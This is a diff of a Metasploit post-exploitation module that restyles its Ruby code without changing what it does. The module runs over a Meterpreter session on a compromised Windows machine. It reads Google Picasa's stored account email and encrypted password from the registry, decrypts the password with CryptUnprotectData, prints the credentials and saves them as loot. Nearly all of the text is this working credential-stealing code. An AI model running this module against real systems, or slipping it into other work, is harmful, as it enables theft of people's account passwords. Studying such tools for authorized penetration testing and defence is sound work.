@@ -3,30 +3,30 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Google Picasa Password Extractor',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Google Picasa Password Extractor',
+        'Description' => %q{
           This module extracts and decrypts the login passwords
           stored by Google Picasa.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-        [
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Unknown', # SecurityXploded Team, www.SecurityXploded.com
           'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
         ],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
-
 
   def prepare_railgun
     rg = session.railgun
@@ -34,7 +34,6 @@ class MetasploitModule < Msf::Post
       rg.add_dll('crypt32')
     end
   end
-
 
   def decrypt_password(data)
     rg = session.railgun
@@ -44,7 +43,7 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(512)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
@@ -57,26 +56,27 @@ class MetasploitModule < Msf::Post
     end
 
     return "" if len == 0
+
     decrypted_pw = process.memory.read(addr, len)
     return decrypted_pw
   end
 
   def get_registry
-
     begin
       print_status("Looking in registry for stored login passwords by Picasa ...")
 
       username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaEmail') || ''
-      password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaPass')  || ''
+      password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaPass') || ''
 
       credentials = Rex::Text::Table.new(
-          'Header'    => "Picasa Credentials",
-          'Indent'    => 1,
-          'Columns'   =>
-          [
-            "User",
-            "Password"
-          ])
+        'Header' => "Picasa Credentials",
+        'Indent' => 1,
+        'Columns' =>
+        [
+          "User",
+          "Password"
+        ]
+      )
 
       foundcreds = 0
       if !username.empty? and !password.empty?
@@ -88,14 +88,13 @@ class MetasploitModule < Msf::Post
           print_good("Username: #{username}\t Password: #{pass}")
 
           foundcreds = 1
-          credentials << [username,pass]
+          credentials << [username, pass]
         end
       end
 
-      #For early versions of Picasa3
+      # For early versions of Picasa3
       username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaEmail') || ''
-      password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaPass')  || ''
-
+      password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaPass') || ''
 
       if !username.empty? and !password.empty?
         passbin = [password].pack("H*")
@@ -106,32 +105,31 @@ class MetasploitModule < Msf::Post
           print_good("Username: #{username}\t Password: #{pass}")
 
           foundcreds = 1
-          credentials << [username,pass]
+          credentials << [username, pass]
         end
       end
 
-    if foundcreds == 1
-      path = store_loot(
-        "picasa.creds",
-        "text/csv",
-        session,
-        credentials.to_csv,
-        "decrypted_picasa_data.csv",
-        "Decrypted Picasa Passwords"
-      )
+      if foundcreds == 1
+        path = store_loot(
+          "picasa.creds",
+          "text/csv",
+          session,
+          credentials.to_csv,
+          "decrypted_picasa_data.csv",
+          "Decrypted Picasa Passwords"
+        )
 
-      print_status("Decrypted passwords saved in: #{path}")
-    else
-      print_status("No Picasa credentials found.")
-    end
-
+        print_status("Decrypted passwords saved in: #{path}")
+      else
+        print_status("No Picasa credentials found.")
+      end
     rescue ::Exception => e
       print_error("An error has occurred: #{e.to_s}")
     end
   end
 
   def run
-    uid = session.sys.config.getuid  #Decryption only works in context of user's account.
+    uid = session.sys.config.getuid  # Decryption only works in context of user's account.
 
     if is_system?
       print_error("This module is running under #{uid}.")
